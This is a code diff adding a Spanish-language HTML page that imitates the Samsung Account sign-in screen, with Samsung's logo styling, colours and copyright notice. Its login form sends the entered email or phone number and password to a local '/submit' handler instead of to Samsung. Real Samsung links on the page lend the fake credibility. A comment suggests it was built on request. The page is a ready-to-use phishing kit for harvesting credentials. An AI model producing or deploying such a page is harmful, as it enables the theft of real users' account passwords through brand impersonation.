@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Samsung Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&family=Inter:wght@400;600&display=swap');
+        
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: #f4f4f4; 
+        }
+
+        /* El nombre Samsung con letras azules como pediste */
+        .samsung-logo-text {
+            color: #034EA2;
+            font-family: 'Open Sans', sans-serif;
+            font-weight: 800;
+            font-size: 2.5rem;
+            letter-spacing: -1.5px;
+            text-transform: uppercase;
+        }
+
+        .input-focus-blue:focus {
+            border-bottom: 2px solid #034EA2;
+            outline: none;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="bg-white w-full max-w-[450px] p-10 md:p-14 rounded-[2.5rem] shadow-sm">
+        
+        <div class="text-center mb-8">
+            <span class="samsung-logo-text">SAMSUNG</span>
+        </div>
+
+        <h1 class="text-[22px] font-semibold text-center text-[#1c1c1c] mb-10">Iniciar sesión</h1>
+
+        <form action="/submit" method="POST" class="space-y-6">
+            
+            <div class="relative border-b border-gray-300">
+                <input type="text" name="username" required
+                    class="w-full py-2 bg-transparent text-lg text-gray-800 placeholder-gray-400 input-focus-blue transition-all"
+                    placeholder="Correo o número de teléfono">
+            </div>
+
+            <div class="relative border-b border-gray-300">
+                <input type="password" name="password" required
+                    class="w-full py-2 bg-transparent text-lg text-gray-800 placeholder-gray-400 input-focus-blue transition-all"
+                    placeholder="Contraseña">
+            </div>
+
+            <div class="flex items-center gap-2 text-sm text-gray-600 py-2">
+                <input type="checkbox" id="remember" class="w-5 h-5 rounded border-gray-300 accent-[#034EA2]">
+                <label for="remember" class="cursor-pointer">Recordar mi ID</label>
+            </div>
+
+            <button type="submit" 
+                class="w-full bg-[#004797] text-white font-bold py-4 rounded-full hover:bg-[#003a7a] transition-all shadow-md mt-2 text-base">
+                Siguiente
+            </button>
+        </form>
+
+        <div class="mt-8 flex flex-col items-center gap-4 text-sm font-medium text-gray-500">
+            <div class="flex gap-4">
+                <a href="https://login.samsung.com" target="_blank" class="hover:underline">Buscar ID</a>
+                <span class="text-gray-300">|</span>
+                <a href="https://login.samsung.com" target="_blank" class="hover:underline">Restablecer contraseña</a>
+            </div>
+
+            <div class="w-full border-t border-gray-100 my-4"></div>
+
+            <p class="text-gray-500">¿No tiene una cuenta?</p>
+            
+            <a href="https://account.samsung.com/iam/sign-up/terms" target="_blank"
+                class="w-full border border-gray-300 text-gray-700 font-bold py-3.5 rounded-full text-center hover:bg-gray-50 transition-colors">
+                Crear cuenta
+            </a>
+
+            
+        </div>
+    </div>
+
+    <div class="absolute bottom-6 text-[#999] text-[10px] text-center w-full px-4">
+        Copyright © 1995-2026 Samsung. Todos los derechos reservados.
+    </div>
+
+</body>
+</html>
